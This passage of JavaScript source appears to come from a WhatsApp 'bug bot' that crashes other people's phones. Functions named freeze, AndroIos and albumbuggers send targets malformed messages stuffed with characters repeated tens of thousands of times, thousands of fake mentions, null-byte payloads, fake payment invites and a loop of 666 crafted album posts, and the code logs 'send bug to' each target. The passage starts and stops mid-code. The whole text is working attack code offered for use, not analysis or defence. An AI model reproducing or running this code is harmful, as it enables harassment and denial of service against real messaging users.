                                                 g r o u p M e n t i o n s :   [ {   g r o u p J i d :   " 1 @ n e w s l e t t e r " ,   g r o u p S u b j e c t :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   } ] 
                                         } 
                                 } 
                         } 
                 } 
         } ) ,   {   u s e r J i d :   t a r g e t   } ) ; 
 
         c o n s t   m s g 1   =   a w a i t   g e n M s g ( ` $ { x e o n I p o n g } ️ ` ,   " � � � � � � � � " . r e p e a t ( 1 0 0 0 ) ) ; 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   m s g 1 . m e s s a g e ,   {   p a r t i c i p a n t :   {   j i d :   t a r g e t   } ,   m e s s a g e I d :   m s g 1 . k e y . i d   } ) ; 
 
         c o n s t   m s g 2   =   a w a i t   g e n M s g ( " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " ,   " \ u 0 0 0 0 "   +   " ꦾ " . r e p e a t ( 1 5 0 0 0 0 )   +   " @ 1 " . r e p e a t ( 2 5 0 0 0 0 ) ) ; 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   m s g 2 . m e s s a g e ,   {   p a r t i c i p a n t :   {   j i d :   t a r g e t   } ,   m e s s a g e I d :   m s g 2 . k e y . i d   } ) ; 
 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 l o c a t i o n M e s s a g e :   { 
                         d e g r e e s L a t i t u d e :   1 7 3 . 2 8 2 , 
                         d e g r e e s L o n g i t u d e :   - 1 9 . 3 7 8 , 
                         n a m e :   x e o n I p o n g , 
                         u r l :   " h t t p s : / / y o u t u b e . c o m / @   " 
                 } 
         } ,   {   p a r t i c i p a n t :   {   j i d :   t a r g e t   }   } ) ; 
 
 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 ' e x t e n d e d T e x t M e s s a g e ' :   { 
                         ' t e x t ' :   x e o n I p o n g , 
                         ' c o n t e x t I n f o ' :   { 
                                 ' s t a n z a I d ' :   t a r g e t , 
                                 ' p a r t i c i p a n t ' :   t a r g e t , 
                                 ' q u o t e d M e s s a g e ' :   { 
                                         ' c o n v e r s a t i o n ' :   ' T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � '   +   ' ꦾ ' . r e p e a t ( 5 0 0 0 0 ) 
                                 } , 
                                 ' d i s a p p e a r i n g M o d e ' :   { 
                                         ' i n i t i a t o r ' :   " C H A N G E D _ I N _ C H A T " , 
                                         ' t r i g g e r ' :   " C H A T _ S E T T I N G " 
                                 } 
                         } , 
                         ' i n v i t e L i n k G r o u p T y p e V 2 ' :   " D E F A U L T " 
                 } 
         } ,   { 
                 ' p a r t i c i p a n t ' :   { 
                         ' j i d ' :   t a r g e t 
                 } 
         } ,   { 
                 ' m e s s a g e I d ' :   n u l l 
         } ) ; 
 
         c o n s t   p a y m e n t M s g   =   s e r v i c e   = >   ( { 
         p a y m e n t I n v i t e M e s s a g e :   { 
                 s e r v i c e T y p e :   s e r v i c e , 
                 e x p i r y T i m e s t a m p :   D a t e . n o w ( )   +   9 1 8 1 4 4 0 0 0 0 0 , 
                 m a x T r a n s a c t i o n A m o u n t :   1 0 0 0 0 0 0 0 0 0 0 , 
                 m a x D a i l y T r a n s a c t i o n :   1 0 0 0 0 0 0 0 0 0 0 0 , 
                 m a x T r a n s a c t i o n F r e q u e n c y :   1 , 
                 s e c u r e M o d e :   t r u e , 
                 v e r i f i c a t i o n R e q u i r e d :   t r u e , 
                 a n t i F r a u d P r o t e c t i o n :   t r u e , 
                 m u l t i F a c t o r A u t h e n t i c a t i o n :   t r u e , 
                 t r a n s a c t i o n L o g g i n g :   t r u e , 
                 g e o L o c k :   t r u e , 
                 s e s s i o n T i m e o u t :   3 0 0 0 0 0 , 
                 b l a c k l i s t I P s :   [ " 1 9 2 . 1 6 8 . 0 . 1 " ,   " 1 9 2 . 1 6 8 . 0 . 2 " ] , 
                 w h i t e l i s t I P s :   [ " 1 9 2 . 1 6 8 . 1 . 1 " ,   " 1 9 2 . 1 6 8 . 1 . 2 " ] , 
                 t r a n s a c t i o n R a t e L i m i t :   3 , 
                 r e a l T i m e F r a u d D e t e c t i o n :   t r u e , 
                 d a i l y L i m i t R e s e t T i m e :   " 0 0 : 0 0 " , 
                 f u l l A u d i t T r a i l :   t r u e , 
                 u s e r B e h a v i o r A n a l y s i s :   t r u e , 
                 t r a n s a c t i o n N o t i f i c a t i o n :   t r u e , 
                 d y n a m i c S e s s i o n T o k e n s :   t r u e , 
                 d e v i c e F i n g e r p r i n t i n g :   t r u e , 
                 t r a n s a c t i o n E n c r y p t i o n :   t r u e , 
                 e n c r y p t e d M s g I D :   g e n e r a t e E n c r y p t e d I D ( s e r v i c e ) 
         } 
 } ) ; 
 
 f u n c t i o n   g e n e r a t e E n c r y p t e d I D ( s e r v i c e )   { 
         r e t u r n   ` E N C _ $ { B u f f e r . f r o m ( s e r v i c e   +   D a t e . n o w ( ) ) . t o S t r i n g ( ' b a s e 6 4 ' ) } ` ; 
 } 
 
 f o r   ( c o n s t   s e r v i c e   o f   [ " F B P A Y " ,   " U P I " ,   " P A Y P A L " ,   " W P P A Y " ,   " G P A Y " ,   " P P " ,   " A P P L E P A Y " ,   " V E N M O " ,   " C A S H A P P " ,   " S T R I P E " ,   " B R A I N T R E E " ,   " s a m S U N G P A Y " ,   " A L I P A Y " ,   " W E C H A T P A Y " ,   " M P A Y " ,   " A I P A Y " ,   " B I O P A Y " ,   " N F T P A Y " ,   " V O I C E P A Y " ,   " B L O C K P A Y " ,   " Q P A Y " ,   " N P A Y " ,   " Z P A Y " ,   " T L O C K " ,   " H O L O " ] )   { 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   p a y m e n t M s g ( s e r v i c e ) ,   { 
                 p a r t i c i p a n t :   {   j i d :   t a r g e t   } , 
                 t i m e s t a m p :   D a t e . n o w ( ) , 
                 r e q u e s t I D :   g e n e r a t e E n c r y p t e d I D ( s e r v i c e ) , 
         } ) ; 
 } 
         
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 l o c a t i o n M e s s a g e :   { 
                         d e g r e e s L a t i t u d e :   1 7 3 . 2 8 2 , 
                         d e g r e e s L o n g i t u d e :   - 1 9 . 3 7 8 , 
                         n a m e :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   +   x e o n I p o n g , 
                         u r l :   " h t t p s : / / y o u t u b e . c o m / @ D G X e o m " 
                 } 
         } ,   {   p a r t i c i p a n t :   {   j i d :   t a r g e t   }   } ) ; 
         
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 l o c a t i o n M e s s a g e :   { 
                         d e g r e e s L a t i t u d e :   1 7 3 . 2 8 2 , 
                         d e g r e e s L o n g i t u d e :   - 1 9 . 3 7 8 , 
                         n a m e :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   +   x e o n I p o n g , 
                         u r l :   " h t t p s : / / y o u t u b e . c o m / @   " 
                 } 
         } ,   {   p a r t i c i p a n t :   {   j i d :   t a r g e t   }   } ) ; 
 } 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
         a s y n c   f u n c t i o n   A n d r o I o s ( t a r g e t )   { 
     c o n s t   m s g   =   { 
         m e s s a g e :   { 
             l o c a t i o n M e s s a g e :   { 
                 d e g r e e s L a t i t u d e :   2 1 . 1 2 6 6 , 
                 d e g r e e s L o n g i t u d e :   - 1 1 . 8 1 9 9 , 
                 n a m e :   " D   |   7 e p p e l i - K i l l e r Q u e e n "   +   " � � � � � � � � " . r e p e a t ( 6 0 0 0 ) , 
                 u r l :   " h t t p s : / / Y u u k e y . "   + " � � � � � � � � " . r e p e a t ( 1 0 0 0 )   +   " . i d " , 
                 c o n t e x t I n f o :   { 
                     e x t e r n a l A d R e p l y :   { 
                         q u o t e d A d :   { 
                             a d v e r t i s e r N a m e :   " � � � � � � � � " . r e p e a t ( 6 0 0 0 ) , 
                             m e d i a T y p e :   " I M A G E " , 
                             j p e g T h u m b n a i l :   " " , 
                             c a p t i o n :   " � � � � � � � � " . r e p e a t ( 1 0 0 0 0 ) 
                         } , 
                         p l a c e h o l d e r K e y :   { 
                             r e m o t e J i d :   " 0 s . w h a t s a p p . n e t " , 
                             f r o m M e :   f a l s e , 
                             i d :   " A B C D E F 1 2 3 4 5 6 7 8 9 0 " 
                         } 
                     } ,   
                     m e n t i o n e d J i d :   A r r a y . f r o m ( {   l e n g t h : 2 0 0 0   } ,   ( _ ,   y )   = >   ` 1 3 1 3 5 5 5 0 0 0 $ { y   +   1 } @ s . w h a t s a p p . n e t ` ) 
                 } 
             } 
         } 
     } ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( " s t a t u s @ b r o a d c a s t " ,   m s g . m e s s a g e ,   { 
         m e s s a g e I d :   m s g . k e y . i d , 
         s t a t u s J i d L i s t :   [ t a r g e t ,   " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " ] , 
         a d d i t i o n a l N o d e s :   [ 
             { 
                 t a g :   " m e t a " , 
                 a t t r s :   { } , 
                 c o n t e n t :   [ 
                     { 
                         t a g :   " m e n t i o n e d _ u s e r s " , 
                         a t t r s :   { } , 
                         c o n t e n t :   [ 
                             { 
                                 t a g :   " t o " , 
                                 a t t r s :   {   j i d :   t a r g e t   } 
                             } 
                         ] 
                     } 
                 ] 
             } 
         ] 
     } ) ; 
 } 
         
         
 
 
         
         
 a s y n c   f u n c t i o n   f r e e z e ( t a r g e t )   { 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
             s t i c k e r P a c k M e s s a g e :   { 
                 s t i c k e r P a c k I d :   " b c d f 1 b 3 8 - 4 e a 9 - 4 f 3 e - b 6 d b - e 4 2 8 e 4 a 5 8 1 e 5 " , 
                 n a m e :   " S P I D E R   � � ️ � � ️ -   S t i c k e r P a c k "   +   " ꦾ " . r e p e a t ( 7 0 0 0 0 ) , 
                 p u b l i s h e r :   " S P I D E R   � � ️   � � ️   M p 4 " , 
                 s t i c k e r s :   [ 
                     {   f i l e N a m e :   " d c N g F + g v 3 1 w V 1 0 M 3 9 - 1 V m c Z e 1 x X w 5 9 K z L d h 5 8 5 8 8 1 K w = . w e b p " ,   i s A n i m a t e d :   f a l s e ,   e m o j i s :   [ " " ] ,   a c c e s s i b i l i t y L a b e l :   " " ,   i s L o t t i e :   f a l s e ,   m i m e t y p e :   " i m a g e / w e b p "   } , 
                     {   f i l e N a m e :   " f M y s G R N - U - b L F a 6 w o s d S 0 e N 4 L J l V Y f N B 7 1 V X Z F c O y e 8 = . w e b p " ,   i s A n i m a t e d :   f a l s e ,   e m o j i s :   [ " " ] ,   a c c e s s i b i l i t y L a b e l :   " " ,   i s L o t t i e :   f a l s e ,   m i m e t y p e :   " i m a g e / w e b p "   } , 
                     {   f i l e N a m e :   " g d 5 I T L z U W J L 0 G L 0 j j N o f U r m z f j 4 A Q Q B f 8 k 3 N m H 1 A 9 0 A = . w e b p " ,   i s A n i m a t e d :   f a l s e ,   e m o j i s :   [ " " ] ,   a c c e s s i b i l i t y L a b e l :   " " ,   i s L o t t i e :   f a l s e ,   m i m e t y p e :   " i m a g e / w e b p "   } , 
                     {   f i l e N a m e :   " q D s m 3 S V P T 6 U h b C M 7 S C t C l t G h x t S w Y B H 0 6 K w x L O v K r b Q = . w e b p " ,   i s A n i m a t e d :   f a l s e ,   e m o j i s :   [ " " ] ,   a c c e s s i b i l i t y L a b e l :   " " ,   i s L o t t i e :   f a l s e ,   m i m e t y p e :   " i m a g e / w e b p "   } , 
                     {   f i l e N a m e :   " g c Z U k 9 4 2 M L B U d V K B 4 W m m t c j v E G L Y U O d S i m K s K R 0 w R c Q = . w e b p " ,   i s A n i m a t e d :   f a l s e ,   e m o j i s :   [ " " ] ,   a c c e s s i b i l i t y L a b e l :   " " ,   i s L o t t i e :   f a l s e ,   m i m e t y p e :   " i m a g e / w e b p "   } , 
                     {   f i l e N a m e :   " 1 v L d k E Z R M G W C 8 2 7 g x 1 q n 7 g X a x H + S O a S R X O X v H + B X E 1 4 = . w e b p " ,   i s A n i m a t e d :   f a l s e ,   e m o j i s :   [ " " ] ,   a c c e s s i b i l i t y L a b e l :   " J a w a   J a w a " ,   i s L o t t i e :   f a l s e ,   m i m e t y p e :   " i m a g e / w e b p "   } , 
                     {   f i l e N a m e :   " d n X a z m 0 T + L j j 9 K 3 Q n P c C M v T C E j t 7 0 X g F o F L r I x F e U B Y = . w e b p " ,   i s A n i m a t e d :   f a l s e ,   e m o j i s :   [ " " ] ,   a c c e s s i b i l i t y L a b e l :   " " ,   i s L o t t i e :   f a l s e ,   m i m e t y p e :   " i m a g e / w e b p "   } , 
                     {   f i l e N a m e :   " g j Z r i X - x + u f v g g W Q W A g x h j b y q p J u N 7 A I Q q R l 4 Z x k H V U = . w e b p " ,   i s A n i m a t e d :   f a l s e ,   e m o j i s :   [ " " ] ,   a c c e s s i b i l i t y L a b e l :   " " ,   i s L o t t i e :   f a l s e ,   m i m e t y p e :   " i m a g e / w e b p "   } 
                 ] , 
                 f i l e L e n g t h :   " 3 6 6 2 9 1 9 " , 
                 f i l e S h a 2 5 6 :   " G 5 M 3 A g 3 Q K 5 o 2 z w 6 n N L 6 B N D Z a I y b d k A E G A a D Z C W f I m m I = " , 
                 f i l e E n c S h a 2 5 6 :   " 2 K m P o p / J 2 C h 7 A Q p N 6 x t W Z o 4 9 W 5 t F y / 4 3 l m S w f e / s 1 0 M = " , 
                 m e d i a K e y :   " r d c i H 1 j B J a 8 V I A e g a Z U 2 E D L / w s W 8 n w s w Z h F f Q o i a u U 0 = " , 
                 d i r e c t P a t h :   " / v / t 6 2 . 1 5 5 7 5 - 2 4 / 1 1 9 2 7 3 2 4 _ 5 6 2 7 1 9 3 0 3 5 5 0 8 6 1 _ 5 1 8 3 1 2 6 6 5 1 4 7 0 0 3 3 4 6 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 1 g F I 6 _ 8 - E t R h L o e l F W n Z J U A y i 7 7 C M e z N o B z w G d 9 1 O K u b J g & o e = 6 8 5 0 1 8 F F & _ n c _ s i d = 5 e 0 3 e 0 " , 
                 c o n t e x t I n f o :   { 
                     r e m o t e J i d :   " X " , 
                     p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
                     s t a n z a I d :   " 1 2 3 4 5 6 7 8 9 0 A B C D E F " , 
                     m e n t i o n e d J i d :   [ 
                         " 6 2 8 5 2 1 5 5 8 7 4 9 8 @ s . w h a t s a p p . n e t " , 
                         . . . A r r a y . f r o m ( {   l e n g t h :   2 5 0 0 0   } ,   ( )   = > 
                                 ` $ { M a t h . f l o o r ( M a t h . r a n d o m ( )   *   9 9 9 9 9 9 ) } @ s . w h a t s a p p . n e t ` 
                         ) 
                     ] 
                 } , 
                 p a c k D e s c r i p t i o n :   " " , 
                 m e d i a K e y T i m e s t a m p :   " 1 7 4 7 5 0 2 0 8 2 " , 
                 t r a y I c o n F i l e N a m e :   " b c d f 1 b 3 8 - 4 e a 9 - 4 f 3 e - b 6 d b - e 4 2 8 e 4 a 5 8 1 e 5 . p n g " , 
                 t h u m b n a i l D i r e c t P a t h :   " / v / t 6 2 . 1 5 5 7 5 - 2 4 / 2 3 5 9 9 4 1 5 _ 9 8 8 9 0 5 4 5 7 7 8 2 8 9 3 8 _ 1 9 6 0 7 8 3 1 7 8 1 5 8 0 2 0 7 9 3 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a 1 g E w I w k 0 c _ M R U c W c F 5 R j U z u r Z b w Z 0 f u r O R 2 7 6 7 p y 6 B - w 2 Q & o e = 6 8 5 0 4 5 A 5 & _ n c _ s i d = 5 e 0 3 e 0 " , 
                 t h u m b n a i l S h a 2 5 6 :   " h o W Y f Q t F 7 w e r h O w P h 7 r 7 R C w H A X J X 0 j t 2 Q Y U A D Q 3 D R y w = " , 
                 t h u m b n a i l E n c S h a 2 5 6 :   " I R a g z s y E Y a B e 3 6 f F 9 0 0 y i U p X z t B p J i W Z U c W 4 R J F Z d j E = " , 
                 t h u m b n a i l H e i g h t :   2 5 2 , 
                 t h u m b n a i l W i d t h :   2 5 2 , 
                 i m a g e D a t a H a s h :   " N G J i O W I 2 M T c 0 M m N j M 2 Q 4 M T Q x Z j g 2 N 2 E 5 N m F k N j g 4 Z T Z h N z V j M z l j N W I 5 O G I 5 N W M 3 N T F i Z W Q 2 Z T Z k Y j A 5 N G Q z O Q = = " , 
                 s t i c k e r P a c k S i z e :   " 3 6 8 0 0 5 4 " , 
                 s t i c k e r P a c k O r i g i n :   " U S E R _ C R E A T E D " 
             } 
         } ,   { } ) ; 
 c o n s o l e . l o g ( ` s e n d   b u g   t o   $ { t a r g e t } ` ) ; 
 } 
 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 
 a s y n c   f u n c t i o n   a l b u m b u g g e r s 1 ( t a r g e t ,   m e n t i o n )   { 
 
     c o n s t   i m a g e C r a s h   =   " h t t p s : / / f i l e s . c a t b o x . m o e / 8 c 1 r d s . j p g " ; 
 
     c o n s t   m e n t i o n e d M e t a A i   =   [ 
         " 1 3 1 3 5 5 5 0 0 0 1 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 3 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 4 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 5 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 6 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 7 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 8 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 9 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 1 0 @ s . w h a t s a p p . n e t " 
     ] ; 
 
     c o n s t   p h o t o   =   { 
         i m a g e :   {   u r l :   i m a g e C r a s h   } , 
         c a p t i o n :   " @ � � � � � � � � � � � � � � � � � �   •   # � � � � � � � � � � � � � �   � � "   
                           +   " \ n " . r e p e a t ( 5 ) 
                           +   " ꦾ " . r e p e a t ( 6 0 0 0 0 ) 
     } ; 
 
     c o n s t   a l b u m   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         a l b u m M e s s a g e :   { 
             e x p e c t e d I m a g e C o u n t :   9 9 9 , 
             e x p e c t e d V i d e o C o u n t :   6 6 6 
         } 
     } ,   { 
         u s e r J i d :   t a r g e t , 
         u p l o a d :   X e o n B o t I n c . w a U p l o a d T o S e r v e r 
     } ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   a l b u m . m e s s a g e ,   {   m e s s a g e I d :   a l b u m . k e y . i d   } ) ; 
 
     f o r   ( l e t   i   =   0 ;   i   <   6 6 6 ;   i + + )   { 
         c o n s t   m s g   =   a w a i t   g e n e r a t e W A M e s s a g e ( t a r g e t ,   p h o t o ,   { 
             u p l o a d :   X e o n B o t I n c . w a U p l o a d T o S e r v e r 
         } ) ; 
 
         c o n s t   t y p e   =   O b j e c t . k e y s ( m s g . m e s s a g e ) . f i n d ( t   = >   t . e n d s W i t h ( ' M e s s a g e ' ) ) ; 
 
         m s g . m e s s a g e [ t y p e ] . c o n t e x t I n f o   =   { 
             m e n t i o n e d J i d :   [ 
                 . . . m e n t i o n e d M e t a A i , 
                 . . . A r r a y . f r o m ( {   l e n g t h :   3 0 0 0 0   } ,   ( )   = > 
                     ` 1 $ { M a t h . f l o o r ( M a t h . r a n d o m ( )   *   5 0 0 0 0 0 ) } @ s . w h a t s a p p . n e t ` 
                 ) 
             ] , 
             b u s i n e s s M e s s a g e F o r w a r d I n f o :   { 
                 b u s i n e s s O w n e r J i d :   " 5 5 2 1 9 9 2 9 9 9 9 9 9 @ s . w h a t s a p p . n e t " 
             } , 
             p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
             r e m o t e J i d :   " s t a t u s @ b r o a d c a s t " , 
             f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
                 n e w s l e t t e r N a m e :   " ꦾ " . r e p e a t ( 1 0 0 ) , 
                 n e w s l e t t e r J i d :   " 1 2 0 3 6 3 3 3 0 3 4 4 8 1 0 2 8 0 @ n e w s l e t t e r " , 
                 s e r v e r M e s s a g e I d :   9 9 9 
             } , 
             m e s s a g e A s s o c i a t i o n :   { 
                 a s s o c i a t i o n T y p e :   1 , 
                 p a r e n t M e s s a g e K e y :   a l b u m . k e y 
             } 
         } ; 
 
         m s g . m e s s a g e . n a t i v e F l o w M e s s a g e   =   { 
             b u t t o n s :   [ 
                 { 
                     t y p e :   " c a l l _ b u t t o n " , 
                     c a l l B u t t o n :   { 
                         d i s p l a y T e x t :   " ꦽ " . r e p e a t ( 9 9 9 9 ) , 
                         p h o n e N u m b e r :   " + 5 5 2 1 9 9 2 9 9 9 9 9 9 " 
                 } 
             } , 
             { 
                     t y p e :   " u r l " , 
                     u r l B u t t o n :   { 
                         d i s p l a y T e x t :   " ꦽ " . r e p e a t ( 9 9 9 9 ) , 
                         u r l :   " h t t p s : / / w a . m e / + 5 5 2 1 9 9 2 9 9 9 9 9 9 ? t e x t = "   +   e n c o d e U R I C o m p o n e n t ( " ꦾ " . r e p e a t ( 6 6 6 6 6 ) ) 
                 } 
             } , 
             { 
                     t y p e :   " u n k n o w n _ t y p e " , 
                     w e i r d B u t t o n :   { 
                         d i s p l a y T e x t :   " ꦽ " . r e p e a t ( 9 9 9 9 ) , 
                         p a y l o a d :   " \ u 0 0 0 0 " . r e p e a t ( 9 9 9 9 ) 
                 } 
             } , 
         ] , 
             c o n t e n t :   { 
                 n a m e s p a c e :   " c a l l _ p e r m i s s i o n _ r e q u e s t _ n a m e s p a c e " , 
                 n a m e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " , 
                     p a r a m s :   [ 
                         {   
                             n a m e :   " c a l l _ t y p e " , 
                             v a l u e :   " v i d e o "   
                         } , 
                         {   
                             n a m e :   " p e r m i s s i o n _ r e a s o n " ,   
                             v a l u e :   " \ u 0 0 0 0 " . r e p e a t ( 9 9 9 9 )   
                         } , 
                         { 
                             n a m e :   " s u p p o r t _ u r l " ,   
                             v a l u e :   " h t t p s : / / w a . m e / + 5 5 2 1 9 9 2 9 9 9 9 9 9 "   
                         } 
                 ] 
             } 
         } ; 
 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( " s t a t u s @ b r o a d c a s t " ,   m s g . m e s s a g e ,   { 
             m e s s a g e I d :   m s g . k e y . i d , 
             s t a t u s J i d L i s t :   [ t a r g e t ] , 
             a d d i t i o n a l N o d e s :   [ 
                 { 
                     t a g :   " m e t a " , 
                     a t t r s :   { } , 
                     c o n t e n t :   [ 
                         { 
                             t a g :   " m e n t i o n e d _ u s e r s " , 
                             a t t r s :   { } , 
                             c o n t e n t :   [ 
                                 {   t a g :   " t o " ,   a t t r s :   {   j i d :   t a r g e t   } ,   c o n t e n t :   u n d e f i n e d   } 
                             ] 
                         } 
                     ] 
                 } 
             ] 
         } ) ; 
 
         i f   ( m e n t i o n )   { 
             a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 s t a t u s M e n t i o n M e s s a g e :   { 
                     m e s s a g e :   {   p r o t o c o l M e s s a g e :   {   k e y :   m s g . k e y ,   t y p e :   2 5   }   } 
                 } 
             } ,   { 
                 a d d i t i o n a l N o d e s :   [ 
                     {   t a g :   " m e t a " ,   a t t r s :   {   i s _ s t a t u s _ m e n t i o n :   " t r u e "   } ,   c o n t e n t :   u n d e f i n e d   } 
                 ] 
             } ) ; 
         } 
     } 
 } 
 
 a s y n c   f u n c t i o n   a l b u m b u g g e r s 2 ( t a r g e t ,   m e n t i o n )   { 
     c o n s t   i m a g e C r a s h   =   " h t t p s : / / f i l e s . c a t b o x . m o e / 8 c 1 r d s . j p g " ; 
 
     c o n s t   m e n t i o n e d M e t a A i   =   [ 
         " 1 3 1 3 5 5 5 0 0 0 1 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 3 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 4 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 5 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 6 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 7 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 8 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 0 9 @ s . w h a t s a p p . n e t " , 
         " 1 3 1 3 5 5 5 0 0 1 0 @ s . w h a t s a p p . n e t " 
     ] ; 
 
     c o n s t   p h o t o   =   { 
         i m a g e :   {   u r l :   i m a g e C r a s h   } , 
         c a p t i o n :   " @ � � � � � � � � � � � � � � � � � �   •   # � � � � � � � � � � � � � �   � � "   
                           +   " \ n " . r e p e a t ( 5 ) 
                           +   " ꦾ " . r e p e a t ( 6 0 0 0 0 ) 
     } ; 
 
     c o n s t   a l b u m   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   { 
         a l b u m M e s s a g e :   { 
             e x p e c t e d I m a g e C o u n t :   9 9 9 , 
             e x p e c t e d V i d e o C o u n t :   6 6 6 
         } 
     } ,   { 
         u s e r J i d :   t a r g e t , 
         u p l o a d :   X e o n B o t I n c . w a U p l o a d T o S e r v e r 
     } ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   a l b u m . m e s s a g e ,   {   m e s s a g e I d :   a l b u m . k e y . i d   } ) ; 
 
     f o r   ( l e t   i   =   0 ;   i   <   6 6 6 ;   i + + )   { 
         c o n s t   m s g   =   a w a i t   g e n e r a t e W A M e s s a g e ( t a r g e t ,   p h o t o ,   { 
             u p l o a d :   X e o n B o t I n c . w a U p l o a d T o S e r v e r 
         } ) ; 
 
         c o n s t   t y p e   =   O b j e c t . k e y s ( m s g . m e s s a g e ) . f i n d ( t   = >   t . e n d s W i t h ( ' M e s s a g e ' ) ) ; 
 
         m s g . m e s s a g e [ t y p e ] . c o n t e x t I n f o   =   { 
             m e n t i o n e d J i d :   [ 
                 . . . m e n t i o n e d M e t a A i , 
                 . . . A r r a y . f r o m ( {   l e n g t h :   4 0 0 0 0   } ,   ( )   = > 
                     ` 1 $ { M a t h . f l o o r ( M a t h . r a n d o m ( )   *   5 0 0 0 0 0 ) } @ s . w h a t s a p p . n e t ` 
                 ) 
             ] , 
             b u s i n e s s M e s s a g e F o r w a r d I n f o :   { 
                 b u s i n e s s O w n e r J i d :   " 5 5 2 1 9 9 2 9 9 9 9 9 9 @ s . w h a t s a p p . n e t " 
             } , 
             p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
             r e m o t e J i d :   t a r g e t , 
             f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
                 n e w s l e t t e r N a m e :   " ꦾ " . r e p e a t ( 1 0 0 ) , 
                 n e w s l e t t e r J i d :   " 1 2 0 3 6 3 3 3 0 3 4 4 8 1 0 2 8 0 @ n e w s l e t t e r " , 
                 s e r v e r M e s s a g e I d :   9 9 9 
             } , 
             m e s s a g e A s s o c i a t i o n :   { 
                 a s s o c i a t i o n T y p e :   1 , 
                 p a r e n t M e s s a g e K e y :   a l b u m . k e y 
             } 
         } ; 
 
         m s g . m e s s a g e . n a t i v e F l o w M e s s a g e   =   { 
             b u t t o n s :   [ 
                 { 
                     t y p e :   " c a l l _ b u t t o n " , 
                     c a l l B u t t o n :   { 
                         d i s p l a y T e x t :   " ꦽ " . r e p e a t ( 9 9 9 9 ) , 
                         p h o n e N u m b e r :   " + 5 5 2 1 9 9 2 9 9 9 9 9 9 " 
                     } 
                 } , 
                 { 
                     t y p e :   " u r l " , 
                     u r l B u t t o n :   { 
                         d i s p l a y T e x t :   " ꦽ " . r e p e a t ( 9 9 9 9 ) , 
                         u r l :   " h t t p s : / / w a . m e / + 5 5 2 1 9 9 2 9 9 9 9 9 9 ? t e x t = "   +   e n c o d e U R I C o m p o n e n t ( " ꦾ " . r e p e a t ( 6 6 6 6 6 ) ) 
                     } 
                 } , 
                 { 
                     t y p e :   " u n k n o w n _ t y p e " , 
                     w e i r d B u t t o n :   { 
                         d i s p l a y T e x t :   " ꦽ " . r e p e a t ( 9 9 9 9 ) , 
                         p a y l o a d :   " \ u 0 0 0 0 " . r e p e a t ( 9 9 9 9 ) 
                     } 
                 } 
             ] , 
             c o n t e n t :   { 
                 n a m e s p a c e :   " c a l l _ p e r m i s s i o n _ r e q u e s t _ n a m e s p a c e " , 
                 n a m e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " , 
